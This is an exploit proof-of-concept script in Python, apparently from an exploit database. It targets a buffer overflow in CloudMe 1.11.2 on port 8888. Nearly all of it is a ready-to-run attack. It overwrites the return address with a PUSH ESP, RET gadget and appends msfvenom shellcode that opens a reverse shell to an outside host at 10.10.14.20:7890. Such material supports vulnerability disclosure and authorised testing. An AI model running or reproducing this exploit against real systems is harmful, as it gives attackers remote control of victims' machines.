# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

# Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

# msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=7890 -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xbb\x81\xbf\xb0\x1c\xda\xd7\xd9\x74\x24\xf4\x5f"
payload += b"\x33\xc9\xb1\x52\x31\x5f\x12\x03\x5f\x12\x83\x6e"
payload += b"\x43\x52\xe9\x8c\x54\x11\x12\x6c\xa5\x76\x9a\x89"
payload += b"\x94\xb6\xf8\xda\x87\x06\x8a\x8e\x2b\xec\xde\x3a"
payload += b"\xbf\x80\xf6\x4d\x08\x2e\x21\x60\x89\x03\x11\xe3"
payload += b"\x09\x5e\x46\xc3\x30\x91\x9b\x02\x74\xcc\x56\x56"
payload += b"\x2d\x9a\xc5\x46\x5a\xd6\xd5\xed\x10\xf6\x5d\x12"
payload += b"\xe0\xf9\x4c\x85\x7a\xa0\x4e\x24\xae\xd8\xc6\x3e"
payload += b"\xb3\xe5\x91\xb5\x07\x91\x23\x1f\x56\x5a\x8f\x5e"
payload += b"\x56\xa9\xd1\xa7\x51\x52\xa4\xd1\xa1\xef\xbf\x26"
payload += b"\xdb\x2b\x35\xbc\x7b\xbf\xed\x18\x7d\x6c\x6b\xeb"
payload += b"\x71\xd9\xff\xb3\x95\xdc\x2c\xc8\xa2\x55\xd3\x1e"
payload += b"\x23\x2d\xf0\xba\x6f\xf5\x99\x9b\xd5\x58\xa5\xfb"
payload += b"\xb5\x05\x03\x70\x5b\x51\x3e\xdb\x34\x96\x73\xe3"
payload += b"\xc4\xb0\x04\x90\xf6\x1f\xbf\x3e\xbb\xe8\x19\xb9"
payload += b"\xbc\xc2\xde\x55\x43\xed\x1e\x7c\x80\xb9\x4e\x16"
payload += b"\x21\xc2\x04\xe6\xce\x17\x8a\xb6\x60\xc8\x6b\x66"
payload += b"\xc1\xb8\x03\x6c\xce\xe7\x34\x8f\x04\x80\xdf\x6a"
payload += b"\xcf\xa5\x15\x7a\x1b\xd2\x2b\x82\x3d\xf0\xa5\x64"
payload += b"\x2b\xe4\xe3\x3f\xc4\x9d\xa9\xcb\x75\x61\x64\xb6"
payload += b"\xb6\xe9\x8b\x47\x78\x1a\xe1\x5b\xed\xea\xbc\x01"
payload += b"\xb8\xf5\x6a\x2d\x26\x67\xf1\xad\x21\x94\xae\xfa"
payload += b"\x66\x6a\xa7\x6e\x9b\xd5\x11\x8c\x66\x83\x5a\x14"
payload += b"\xbd\x70\x64\x95\x30\xcc\x42\x85\x8c\xcd\xce\xf1"
payload += b"\x40\x98\x98\xaf\x26\x72\x6b\x19\xf1\x29\x25\xcd"
payload += b"\x84\x01\xf6\x8b\x88\x4f\x80\x73\x38\x26\xd5\x8c"
payload += b"\xf5\xae\xd1\xf5\xeb\x4e\x1d\x2c\xa8\x7f\x54\x6c"
payload += b"\x99\x17\x31\xe5\x9b\x75\xc2\xd0\xd8\x83\x41\xd0"
payload += b"\xa0\x77\x59\x91\xa5\x3c\xdd\x4a\xd4\x2d\x88\x6c"
payload += b"\x4b\x4d\x99"



overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)